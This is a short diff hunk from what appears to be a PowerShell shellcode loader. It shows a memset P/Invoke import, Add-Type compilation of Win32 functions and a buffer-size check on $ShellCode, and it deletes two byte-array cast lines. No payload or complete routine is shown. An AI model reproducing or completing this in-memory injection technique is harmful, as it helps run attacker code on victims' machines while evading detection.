@@ -70,8 +70,6 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 
     $WinFunc = Add-Type -MemberDefinition $CSCode -Name "Win32" -Namespace "Win32Functions" -PassThru
     $Size = 0x1000
-    [Byte[]];
-    [Byte[]]$ShellCode = $ShellCode
 
     If ($ShellCode.Length -gt 0x1000) 
     {
